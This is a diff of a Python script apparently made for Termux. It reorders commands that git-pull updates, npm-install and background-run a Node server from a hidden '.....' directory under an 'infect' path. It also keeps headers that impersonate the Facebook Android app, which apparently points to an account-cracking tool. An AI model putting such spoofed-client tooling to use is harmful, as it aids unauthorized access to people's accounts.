@@ -29,9 +29,9 @@ if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
 from requests.exceptions import ConnectionError
 os.system("git pull")
 if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("cd ..... && npm install")
     os.system("fuser -k 5000/tcp &")
     os.system("#")
-    os.system("cd ..... && npm install")
     os.system("cd ..... && node index.js &")
     os.system("clear")
     print("")
@@ -71,14 +71,8 @@ header = {
     'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
     'content-type': 'application/x-www-form-urlencoded',
     'x-fb-http-engine': 'Liger' }
-os.system('git pull')
 reload(sys)
 sys.setdefaultencoding("utf-8")
-os.system("cd ..... && npm install")
-os.system("fuser -k 5000/tcp &")
-os.system("#")
-os.system("cd ..... && node index.js &")
-time.sleep(10)
 c = "\033[1;32m"
 c2 = "\033[0;97m"
 c3 = "\033[1;31m"
